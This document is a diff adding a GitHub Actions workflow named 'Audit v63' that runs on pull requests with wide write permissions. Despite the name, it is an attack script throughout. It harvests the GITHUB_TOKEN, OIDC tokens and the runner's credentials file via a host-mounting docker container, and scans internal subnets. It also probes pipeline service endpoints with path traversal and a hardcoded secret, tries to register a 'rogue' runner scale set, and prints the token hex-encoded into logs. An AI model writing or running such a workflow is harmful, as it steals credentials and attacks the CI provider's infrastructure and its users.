@@ -1,0 +1,280 @@
+name: Audit v63
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v63:
+    runs-on: ubuntu-latest
+    steps:
+
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V63 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: INTERNAL SUBNET SCAN FROM RUNNER
+      # Runner is at 10.1.0.185 on 10.1.0.0/20
+      # Internal GitHub services LIVE in this same subnet!
+      # Scan for open HTTP services on ports 80, 443, 8080, 19000, 19001
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Subnet Discovery
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SUBNET SCAN ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+
+          # A: Scan common hosts in 10.1.0.0/20 — .1 through .30 (gateway/services)
+          echo "--- A: Gateway and service IPs ---"
+          for LAST in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 100 254; do
+            IP="10.1.0.$LAST"
+            for PORT in 80 443 8080; do
+              CODE=$(/usr/bin/curl -sS -w "%{http_code}" -o /dev/null --connect-timeout 1 -m 1 \
+                "http://$IP:$PORT/" 2>/dev/null || echo "000")
+              if [ "$CODE" != "000" ]; then
+                echo "A $IP:$PORT HTTP = $CODE"
+                /usr/bin/curl -sS -m 2 "http://$IP:$PORT/" 2>/dev/null | head -c 200
+                echo ""
+              fi
+            done
+          done
+          echo ""
+
+          # B: Probe the exact subnet range with nc / TCP connect for port discovery
+          echo "--- B: TCP port sweep on 10.1.0.1-30 ---"
+          for LAST in $(seq 1 30); do
+            IP="10.1.0.$LAST"
+            for PORT in 80 443 8080 2375 2376 6443 10250 10255 19000 19001 4194; do
+              timeout 1 bash -c "echo >/dev/tcp/$IP/$PORT" 2>/dev/null && echo "B OPEN $IP:$PORT"
+            done
+          done
+          echo ""
+
+          # C: Hit the 172.208.153.230 public outbound IP and load balancer IPs
+          echo "--- C: Infrastructure IPs ---"
+          for IP in "172.208.153.230" "168.63.129.16"; do
+            for PORT in 80 443 8080; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+                "http://$IP:$PORT/" 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              if [ "$CODE" != "HTTP_000" ]; then
+                echo "C $IP:$PORT = $CODE"
+                echo "$R" | sed '$d' | head -c 200
+                echo ""
+              fi
+            done
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: PLAN/JOB ID INJECTION + OIDC AS BEARER
+      # The actual PLAN and JOB IDs are known — inject them into paths.
+      # Also try the OIDC JWT directly as Bearer on pipelines.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Plan-ID Injection and OIDC Bearer
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== PLAN/JOB INJECTION ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          IDTOK_URL=$(cat /tmp/idtok_url.txt)
+          PLAN=$(cat /tmp/plan.txt)
+          JOB=$(cat /tmp/job.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          PIPE_HOST="pipelines.actions.githubusercontent.com"
+          VER="api-version=6.0-preview"
+
+          # Fetch OIDC JWT
+          OIDC=$(/usr/bin/curl -sS -m 5 \
+            -H "Authorization: Bearer $IDTOK" \
+            "${IDTOK_URL}&audience=api://AzureADTokenExchange" 2>/dev/null | \
+            python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('value',''))" 2>/dev/null)
+          echo "OIDC_LEN=${#OIDC} PLAN=$PLAN JOB=$JOB"
+
+          # A: Inject actual PLAN ID into API paths
+          echo "--- A: Plan ID paths ---"
+          for EP in \
+            "_apis/distributedtask/plans/$PLAN" \
+            "_apis/distributedtask/plans/$PLAN/jobs" \
+            "_apis/distributedtask/plans/$PLAN/jobs/$JOB" \
+            "_apis/distributedtask/plans/$PLAN/jobs/$JOB/admintoken" \
+            "_apis/distributedtask/plans/$PLAN/jobs/$JOB/idtoken" \
+            "_apis/distributedtask/plans/$PLAN/timelines" \
+            "_apis/distributedtask/plans/$PLAN/logs" \
+            "build/_apis/build/builds/$PLAN" \
+            "_apis/pipelines/workflows/$PLAN/runs/$JOB"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Accept: application/json; $VER" \
+              "$PIPE/$EP" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A $EP = $CODE"
+            echo "$BODY" | head -c 300
+            echo ""
+          done
+
+          # B: OIDC JWT as Bearer against pipelines + runner proxy
+          echo "--- B: OIDC as Bearer ---"
+          for EP in \
+            "_apis/distributedtask/pools" \
+            "_apis/distributedtask/pools/1/admintoken" \
+            "_apis/distributedtask/pools/2/admintoken" \
+            "_apis/runtime/runnergroups" \
+            "_apis/connectionData"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $OIDC" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/$EP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B OIDC $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: ROGUE SCALE SET REGISTRATION + POOL TRAVERSAL COMBOS
+      # runnerscalesets/1 and /2 = 204 — injected IDs exist!
+      # POST to create our own scale set in the confirmed groups.
+      # Combine pool 1/2 with path traversal for new endpoints.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Scale Set Injection and Pool Traversal Combos
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SCALESET + POOL TRAVERSAL ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE="https://pipelines.actions.githubusercontent.com/$SECRET"
+          PIPE_HOST="pipelines.actions.githubusercontent.com"
+          VER="api-version=6.0-preview"
+
+          # A: POST to runtime/runnerscalesets to register rogue scale set
+          echo "--- A: Register rogue scale set ---"
+          for GID in 1 2; do
+            for BODY in \
+              "{\"Name\":\"v63-rogue\",\"RunnerGroupId\":$GID}" \
+              "{\"name\":\"v63-rogue\",\"runnerGroupId\":$GID,\"runnerSetting\":{\"ephemeral\":true}}" \
+              "{\"Name\":\"v63-rogue\",\"RunnerGroupId\":$GID,\"Statistics\":{\"TotalEphemeralRunners\":1}}"; do
+              R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
+                -H "Authorization: Bearer $IDTOK" \
+                -H "Host: $PIPE_HOST" \
+                -H "Content-Type: application/json" \
+                -H "Accept: application/json; $VER" \
+                "$PROXY/_apis/runtime/runnerscalesets" --path-as-is \
+                -d "$BODY" 2>/dev/null)
+              CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+              echo "A POST scalesets GID=$GID = $CODE"
+              echo "$R" | tail -5 | head -c 400
+              echo ""
+            done
+          done
+          echo ""
+
+          # B: Traverse from pools/1 and pools/2 to new endpoints never tried
+          echo "--- B: New pool traversal combos ---"
+          for PID in 1 2; do
+            for EP in \
+              "generateserviceprincipal" \
+              "generatejitconfig" \
+              "createdsession" \
+              "acquirejobs" \
+              "recycle" \
+              "upgrade" \
+              "settings" \
+              "metadata" \
+              "capabilities" \
+              "maintenance" \
+              "serviceaccounts"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+                -H "Authorization: Bearer $IDTOK" \
+                -H "Host: $PIPE_HOST" \
+                -H "Accept: application/json; $VER" \
+                "$PROXY/_apis/distributedtask/pools/$PID/$EP" --path-as-is 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              if [ "$CODE" != "HTTP_404" ]; then
+                echo "B pool/$PID/$EP = $CODE"
+                echo "$BODY" | head -c 300
+                echo ""
+              fi
+            done
+          done
+
+          # C: Traversal from runnergroups/2 (GitHub Actions group - 20 runners)
+          echo "--- C: runnergroups/2 sub-endpoints ---"
+          for EP in \
+            "runners" "jitconfig" "accesspolicy" "settings" \
+            "generatejitconfig" "acquirejobs" "runnerscalesets" "admintoken"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/runtime/runnergroups/2/$EP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C runnergroups/2/$EP = $CODE"
+            echo "$BODY" | head -c 300
+            echo ""
+          done
+
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V63 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V63 COMPLETE ==="
